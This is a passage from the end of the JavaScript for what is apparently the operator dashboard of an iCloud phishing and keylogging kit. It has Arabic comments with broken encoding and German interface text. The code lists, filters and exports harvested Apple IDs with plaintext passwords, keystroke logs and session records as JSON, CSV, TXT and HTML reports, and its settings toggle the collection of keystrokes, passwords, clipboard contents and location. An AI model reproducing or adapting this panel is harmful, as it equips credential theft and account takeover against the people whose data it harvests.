                // ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßÿ™ÿµÿßŸÑ ÿßŸÑŸÜÿ∏ÿßŸÖ ÿßŸÑŸÖÿ±ŸÉÿ≤Ÿä
                this.checkBrainConnection();
            }
            
            checkBrainConnection() {
                // ŸäŸÖŸÉŸÜ ÿ•ÿ∂ÿßŸÅÿ© ÿßÿ™ÿµÿßŸÑ ŸÅÿπŸÑŸä ÿ®ÿßŸÑŸÜÿ∏ÿßŸÖ ÿßŸÑŸÖÿ±ŸÉÿ≤Ÿä ŸáŸÜÿß
                const brainConnected = localStorage.getItem('brain_connected') === 'true';
                
                if (brainConnected) {
                    console.log('üß† Brain system connected');
                }
            }
            
            updateAnalytics() {
                // ŸäŸÖŸÉŸÜ ÿ•ÿ∂ÿßŸÅÿ© ÿ±ÿ≥ŸàŸÖ ÿ®ŸäÿßŸÜŸäÿ© ŸÅÿπŸÑŸäÿ© ŸáŸÜÿß
                const activityCtx = document.getElementById('activityChart')?.getContext('2d');
                const deviceCtx = document.getElementById('deviceChart')?.getContext('2d');
                
                if (activityCtx) {
                    // ŸÖÿ´ÿßŸÑ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ŸÖ ÿßŸÑÿ®ŸäÿßŸÜŸä
                    activityCtx.clearRect(0, 0, 400, 200);
                    
                    // ŸäŸÖŸÉŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÖŸÉÿ™ÿ®ÿ© ŸÖÿ´ŸÑ Chart.js ŸáŸÜÿß
                    activityCtx.font = '12px Arial';
                    activityCtx.fillText('Aktivit√§tsdiagramm hier', 50, 100);
                }
                
                if (deviceCtx) {
                    deviceCtx.clearRect(0, 0, 400, 200);
                    deviceCtx.font = '12px Arial';
                    deviceCtx.fillText('Ger√§teverteilung hier', 50, 100);
                }
            }
            
            exportData(format) {
                const allData = {
                    metadata: {
                        exportTime: new Date().toISOString(),
                        totalRecords: {
                            credentials: this.data.credentials.length,
                            keystrokes: this.data.keystrokes.length,
                            sessions: this.data.sessions.length,
                            visits: this.data.visits.length,
                            loginAttempts: this.data.loginAttempts.length
                        }
                    },
                    data: this.data
                };
                
                let content, filename, mimeType;
                
                switch(format) {
                    case 'json':
                        content = JSON.stringify(allData, null, 2);
                        filename = `icloud_data_${Date.now()}.json`;
                        mimeType = 'application/json';
                        break;
                    case 'csv':
                        content = this.convertToCSV(allData);
                        filename = `icloud_data_${Date.now()}.csv`;
                        mimeType = 'text/csv';
                        break;
                    case 'txt':
                        content = this.convertToTXT(allData);
                        filename = `icloud_data_${Date.now()}.txt`;
                        mimeType = 'text/plain';
                        break;
                    case 'html':
                        content = this.generateHTMLReport(allData);
                        filename = `icloud_report_${Date.now()}.html`;
                        mimeType = 'text/html';
                        break;
                }
                
                this.downloadFile(content, filename, mimeType);
            }
            
            convertToCSV(data) {
                let csv = 'Type,AppleID,Password,Device,IP,Time\n';
                
                data.data.credentials.forEach(cred => {
                    csv += `Credential,"${cred.appleId || ''}","${cred.password || ''}","${cred.device || ''}","${cred.ip || ''}","${cred.timestamp || ''}"\n`;
                });
                
                data.data.sessions.forEach(session => {
                    csv += `Session,"","","${session.device || ''}","","${session.timestamp || ''}"\n`;
                });
                
                return csv;
            }
            
            convertToTXT(data) {
                let txt = '='.repeat(70) + '\n';
                txt += 'iCloud Monitoring Report\n';
                txt += '='.repeat(70) + '\n\n';
                
                txt += 'üìä Statistics:\n';
                txt += '-'.repeat(40) + '\n';
                txt += `‚Ä¢ Total Credentials: ${data.metadata.totalRecords.credentials}\n`;
                txt += `‚Ä¢ Total Keystrokes: ${data.metadata.totalRecords.keystrokes}\n`;
                txt += `‚Ä¢ Total Sessions: ${data.metadata.totalRecords.sessions}\n\n`;
                
                txt += 'üîê Credentials:\n';
                txt += '-'.repeat(40) + '\n';
                data.data.credentials.forEach((cred, index) => {
                    txt += `\n${index + 1}. ${cred.appleId || 'N/A'}\n`;
                    txt += `   Password: ${cred.password || 'N/A'}\n`;
                    txt += `   Device: ${cred.device || 'Unknown'}\n`;
                    txt += `   IP: ${cred.ip || 'Unknown'}\n`;
                    txt += `   Time: ${new Date(cred.timestamp).toLocaleString('de-DE')}\n`;
                });
                
                return txt;
            }
            
            generateHTMLReport(data) {
                return `
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>iCloud Monitoring Report</title>
                        <style>
                            body { font-family: Arial, sans-serif; margin: 40px; }
                            table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
                            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                            th { background-color: #f2f2f2; }
                            .credential { background-color: #fff0f0; }
                            .session { background-color: #f0f8ff; }
                        </style>
                    </head>
                    <body>
                        <h1>iCloud Monitoring Report</h1>
                        <p>Generated: ${new Date().toLocaleString('de-DE')}</p>
                        
                        <h2>Summary</h2>
                        <p>Total Credentials: ${data.metadata.totalRecords.credentials}</p>
                        <p>Total Keystrokes: ${data.metadata.totalRecords.keystrokes}</p>
                        <p>Total Sessions: ${data.metadata.totalRecords.sessions}</p>
                        
                        <h2>Credentials</h2>
                        <table>
                            <tr>
                                <th>Apple ID</th>
                                <th>Password</th>
                                <th>Device</th>
                                <th>IP</th>
                                <th>Time</th>
                            </tr>
                            ${data.data.credentials.map(cred => `
                                <tr class="credential">
                                    <td>${cred.appleId || 'N/A'}</td>
                                    <td>${cred.password || 'N/A'}</td>
                                    <td>${cred.device || 'Unknown'}</td>
                                    <td>${cred.ip || 'Unknown'}</td>
                                    <td>${new Date(cred.timestamp).toLocaleString('de-DE')}</td>
                                </tr>
                            `).join('')}
                        </table>
                        
                        <h2>Sessions</h2>
                        <table>
                            <tr>
                                <th>Session ID</th>
                                <th>Device</th>
                                <th>Duration</th>
                                <th>Time</th>
                            </tr>
                            ${data.data.sessions.map(session => `
                                <tr class="session">
                                    <td>${session.sessionId ? session.sessionId.substring(0, 12) + '...' : 'N/A'}</td>
                                    <td>${session.device || 'Unknown'}</td>
                                    <td>${session.sessionDuration ? session.sessionDuration + 's' : 'N/A'}</td>
                                    <td>${new Date(session.timestamp).toLocaleString('de-DE')}</td>
                                </tr>
                            `).join('')}
                        </table>
                    </body>
                    </html>
                `;
            }
            
            downloadFile(content, filename, mimeType) {
                try {
                    const blob = new Blob([content], { type: mimeType });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = filename;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    
                    alert(`Datei ${filename} wurde heruntergeladen`);
                    
                } catch (error) {
                    console.error('‚ùå Export error:', error);
                    alert('Fehler beim Exportieren der Datei');
                }
            }
            
            filterCredentials() {
                const searchTerm = document.getElementById('credentialSearch').value.toLowerCase();
                const rows = document.querySelectorAll('#credentialsBody tr');
                
                rows.forEach(row => {
                    const text = row.textContent.toLowerCase();
                    row.style.display = text.includes(searchTerm) ? '' : 'none';
                });
            }
        }
        
        // ==================== Global Variables ====================
        
        let dashboard;
        
        // ==================== Initialize Dashboard ====================
        
        document.addEventListener('DOMContentLoaded', function() {
            dashboard = new DashboardSystem();
            
            // ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ£ŸàŸÑŸä
            document.getElementById('lastUpdate').textContent = 
                'Aktualisiert: ' + new Date().toLocaleTimeString('de-DE');
            
            // ÿ™ÿ≠ÿØŸäÿ´ ÿ≠ÿßŸÑÿ© ÿßŸÑÿßÿ™ÿµÿßŸÑ
            setInterval(() => {
                dashboard.updateConnectionStatus();
            }, 5000);
            
            console.log('‚úÖ Dashboard ready');
        });
        
        // ==================== Global Functions ====================
        
        function switchTab(tabName) {
            // ÿ•ÿÆŸÅÿßÿ° ÿ¨ŸÖŸäÿπ ÿßŸÑÿ™ÿ®ŸàŸäÿ®ÿßÿ™
            const tabs = ['dashboard', 'credentials', 'keystrokes', 'sessions', 'analytics', 'export', 'settings'];
            tabs.forEach(tab => {
                const tabEl = document.getElementById(tab + 'Tab');
                if (tabEl) tabEl.style.display = 'none';
                
                const navLink = document.querySelector(`.nav-link[href="#${tab}"]`);
                if (navLink) navLink.classList.remove('active');
            });
            
            // ÿ•ÿ∏Ÿáÿßÿ± ÿßŸÑÿ™ÿ®ŸàŸäÿ® ÿßŸÑŸÖÿ≠ÿØÿØ
            const activeTab = document.getElementById(tabName + 'Tab');
            if (activeTab) {
                activeTab.style.display = 'block';
                
                const activeNavLink = document.querySelector(`.nav-link[href="#${tabName}"]`);
                if (activeNavLink) activeNavLink.classList.add('active');
                
                // ÿ™ÿ≠ÿØŸäÿ´ ÿπŸÜŸàÿßŸÜ ÿßŸÑÿµŸÅÿ≠ÿ©
                document.getElementById('pageTitle').textContent = 
                    tabName.charAt(0).toUpperCase() + tabName.slice(1);
                
                // ÿ™ÿ≠ÿØŸäÿ´ ÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑÿ™ÿ®ŸàŸäÿ®
                if (tabName === 'credentials') {
                    dashboard.displayCredentials();
                } else if (tabName === 'keystrokes') {
                    dashboard.updateKeystrokeFeed();
                } else if (tabName === 'analytics') {
                    dashboard.updateAnalytics();
                }
            }
        }
        
        function refreshData() {
            dashboard.loadAllData();
            dashboard.updateStats();
            
            // ÿπÿ±ÿ∂ ÿ±ÿ≥ÿßŸÑÿ© ŸÜÿ¨ÿßÿ≠
            showNotification('Daten wurden aktualisiert', 'success');
        }
        
        function exportAllData() {
            dashboard.exportData('json');
        }
        
        function clearAllData() {
            if (confirm('Sind Sie sicher, dass Sie alle Daten l√∂schen m√∂chten? Dies kann nicht r√ºckg√§ngig gemacht werden.')) {
                localStorage.clear();
                sessionStorage.clear();
                
                // ÿ•ÿπÿßÿØÿ© ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™
                dashboard.loadAllData();
                dashboard.updateStats();
                
                showNotification('Alle Daten wurden gel√∂scht', 'danger');
            }
        }
        
        function deleteAllCredentials() {
            if (confirm('Alle Anmeldedaten l√∂schen?')) {
                localStorage.removeItem('brain_storage');
                localStorage.removeItem('credentials');
                
                dashboard.loadAllData();
                dashboard.updateStats();
                
                showNotification('Anmeldedaten wurden gel√∂scht', 'danger');
            }
        }
        
        function deleteCredential(index) {
            if (confirm('Diese Anmeldedaten l√∂schen?')) {
                const credentials = JSON.parse(localStorage.getItem('brain_storage') || '[]');
                credentials.splice(index, 1);
                localStorage.setItem('brain_storage', JSON.stringify(credentials));
                
                dashboard.loadAllData();
                dashboard.updateStats();
                
                showNotification('Anmeldedaten gel√∂scht', 'danger');
            }
        }
        
        function togglePassword(element, password) {
            if (element.textContent.includes('‚Ä¢')) {
                element.textContent = password;
            } else {
                element.textContent = '‚Ä¢'.repeat(Math.min(password.length, 8));
            }
        }
        
        function toggleKeystrokeFeed() {
            const btn = document.getElementById('keystrokeToggle');
            
            if (dashboard.isLive) {
                dashboard.isLive = false;
                btn.innerHTML = '‚ñ∂Ô∏è Feed fortsetzen';
            } else {
                dashboard.isLive = true;
                btn.innerHTML = '‚è∏Ô∏è Feed pausieren';
                dashboard.updateKeystrokeFeed();
            }
        }
        
        function exportKeystrokes() {
            dashboard.exportData('txt');
        }
        
        function showSessionDetails(sessionId) {
            const modal = document.getElementById('detailsModal');
            const modalContent = document.getElementById('modalContent');
            
            // ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ ÿßŸÑÿ¨ŸÑÿ≥ÿ©
            const session = dashboard.data.sessions.find(s => s.sessionId === sessionId);
            
            if (!session) {
                modalContent.innerHTML = '<p>Session nicht gefunden</p>';
                modal.style.display = 'flex';
                return;
            }
            
            // ÿ¨ŸÖÿπ ÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑÿ¨ŸÑÿ≥ÿ©
            const sessionKeystrokes = dashboard.data.keystrokes.filter(k => k.sessionId === sessionId);
            const sessionCredentials = dashboard.data.credentials.filter(c => c.sessionId === sessionId);
            
            let details = `
                <h3>Session Details</h3>
                <div class="session-info">
                    <div class="session-grid">
                        <div class="info-item">
                            <span class="info-label">Session ID:</span>
                            <span class="info-value">${sessionId}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Start Time:</span>
                            <span class="info-value">${new Date(session.timestamp).toLocaleString('de-DE')}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Duration:</span>
                            <span class="info-value">${session.sessionDuration || 0} seconds</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Device:</span>
                            <span class="info-value">${session.device || 'Unknown'}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Keystrokes:</span>
                            <span class="info-value">${sessionKeystrokes.length}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Credentials:</span>
                            <span class="info-value">${sessionCredentials.length}</span>
                        </div>
                    </div>
                </div>
            `;
            
            if (sessionCredentials.length > 0) {
                details += `
                    <h4>Credentials from this session:</h4>
                    <table style="width: 100%; border-collapse: collapse; margin-top: 10px;">
                        <tr>
                            <th style="padding: 8px; border: 1px solid #ddd;">Apple ID</th>
                            <th style="padding: 8px; border: 1px solid #ddd;">Password</th>
                        </tr>
                        ${sessionCredentials.map(cred => `
                            <tr>
                                <td style="padding: 8px; border: 1px solid #ddd;">${cred.appleId || 'N/A'}</td>
                                <td style="padding: 8px; border: 1px solid #ddd;">${'‚Ä¢'.repeat(cred.password ? Math.min(cred.password.length, 8) : 8)}</td>
                            </tr>
                        `).join('')}
                    </table>
                `;
            }
            
            modalContent.innerHTML = details;
            modal.style.display = 'flex';
        }
        
        function closeModal() {
            document.getElementById('detailsModal').style.display = 'none';
        }
        
        function exportData(format) {
            dashboard.exportData(format);
        }
        
        function toggleAutoExport() {
            const autoExport = document.getElementById('autoExport').checked;
            if (autoExport) {
                const interval = document.getElementById('exportInterval').value;
                showNotification(`Automatischer Export aktiviert (${interval})`, 'success');
            } else {
                showNotification('Automatischer Export deaktiviert', 'danger');
            }
        }
        
        function saveSettings() {
            const settings = {
                collectKeystrokes: document.getElementById('collectKeystrokes').checked,
                collectPasswords: document.getElementById('collectPasswords').checked,
                collectClipboard: document.getElementById('collectClipboard').checked,
                collectLocation: document.getElementById('collectLocation').checked,
                useLocalStorage: document.getElementById('useLocalStorage').checked,
                useIndexedDB: document.getElementById('useIndexedDB').checked,
                useServer: document.getElementById('useServer').checked,
                encryptionKey: document.getElementById('encryptionKey').value
            };
            
            localStorage.setItem('dashboard_settings', JSON.stringify(settings));
            showNotification('Einstellungen gespeichert', 'success');
        }
        
        function showNotification(message, type) {
            // ÿ•ŸÜÿ¥ÿßÿ° ÿπŸÜÿµÿ± ÿßŸÑÿ•ÿ¥ÿπÿßÿ±
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                padding: 15px 25px;
                background: ${type === 'success' ? 'var(--apple-green)' : 'var(--apple-red)'};
                color: white;
                border-radius: 8px;
                z-index: 10000;
                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                animation: slideIn 0.3s ease-out;
            `;
            
            notification.textContent = message;
            document.body.appendChild(notification);
            
            // ÿ•ÿ≤ÿßŸÑÿ© ÿßŸÑÿ•ÿ¥ÿπÿßÿ± ÿ®ÿπÿØ 3 ÿ´ŸàÿßŸÜŸä
            setTimeout(() => {
                notification.style.animation = 'slideOut 0.3s ease-in';
                setTimeout(() => {
                    document.body.removeChild(notification);
                }, 300);
            }, 3000);
            
            // ÿ•ÿ∂ÿßŸÅÿ© ÿ£ŸÜŸäŸÖŸäÿ¥ŸÜ
            const style = document.createElement('style');
            style.textContent = `
                @keyframes slideIn {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes slideOut {
                    from { transform: translateX(0); opacity: 1; }
                    to { transform: translateX(100%); opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }
        
        // ÿ•ÿ∫ŸÑÿßŸÇ ÿßŸÑŸÜÿßŸÅÿ∞ÿ© ÿπŸÜÿØ ÿßŸÑŸÜŸÇÿ± ÿÆÿßÿ±ÿ¨Ÿáÿß
        window.onclick = function(event) {
            const modal = document.getElementById('detailsModal');
            if (event.target === modal) {
                closeModal();
            }
        };
        
        // ÿßÿÆÿ™ÿµÿßÿ±ÿßÿ™ ŸÑŸàÿ≠ÿ© ÿßŸÑŸÖŸÅÿßÿ™Ÿäÿ≠
        document.addEventListener('keydown', function(event) {
            // Ctrl+R ŸÑÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™
            if (event.ctrlKey && event.key === 'r') {
                event.preventDefault();
                refreshData();
            }
            
            // Ctrl+E ŸÑŸÑÿ™ÿµÿØŸäÿ±
            if (event.ctrlKey && event.key === 'e') {
                event.preventDefault();
                exportAllData();
            }
            
            // Ctrl+L ŸÑÿ™ŸÅÿ±Ÿäÿ∫ ÿßŸÑÿ≥ÿ¨ŸÑÿßÿ™
            if (event.ctrlKey && event.key === 'l') {
                event.preventDefault();
                clearAllData();
            }
            
            // F1 ŸÑŸÑŸÖÿ≥ÿßÿπÿØÿ©
            if (event.key === 'F1') {
                event.preventDefault();
                alert('Dashboard Help\n\nCtrl+R - Refresh data\nCtrl+E - Export all data\nCtrl+L - Clear all data\nF1 - Show this help');
            }
        });
        
        // ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿπŸÜÿØ ÿ∏ŸáŸàÿ± ÿßŸÑÿµŸÅÿ≠ÿ©
        window.addEventListener('focus', function() {
            dashboard.loadAllData();
            dashboard.updateStats();
        });
        
        // ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ•ÿπÿØÿßÿØÿßÿ™ ÿßŸÑŸÖÿ≠ŸÅŸàÿ∏ÿ©
        function loadSettings() {
            try {
                const settings = JSON.parse(localStorage.getItem('dashboard_settings') || '{}');
                
                if (settings.collectKeystrokes !== undefined) {
                    document.getElementById('collectKeystrokes').checked = settings.collectKeystrokes;
                }
                
                if (settings.collectPasswords !== undefined) {
                    document.getElementById('collectPasswords').checked = settings.collectPasswords;
                }
                
                if (settings.collectClipboard !== undefined) {
                    document.getElementById('collectClipboard').checked = settings.collectClipboard;
                }
                
                if (settings.collectLocation !== undefined) {
                    document.getElementById('collectLocation').checked = settings.collectLocation;
                }
                
                if (settings.useLocalStorage !== undefined) {
                    document.getElementById('useLocalStorage').checked = settings.useLocalStorage;
                }
                
                if (settings.useIndexedDB !== undefined) {
                    document.getElementById('useIndexedDB').checked = settings.useIndexedDB;
                }
                
                if (settings.useServer !== undefined) {
                    document.getElementById('useServer').checked = settings.useServer;
                }
                
                if (settings.encryptionKey !== undefined) {
                    document.getElementById('encryptionKey').value = settings.encryptionKey;
                }
                
            } catch (error) {
                console.warn('‚ö†Ô∏è Settings load error:', error);
            }
        }
        
        // ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ•ÿπÿØÿßÿØÿßÿ™ ÿπŸÜÿØ ÿßŸÑÿ®ÿØÿ°
        setTimeout(loadSettings, 1000);
    </script>
</body>
</html>
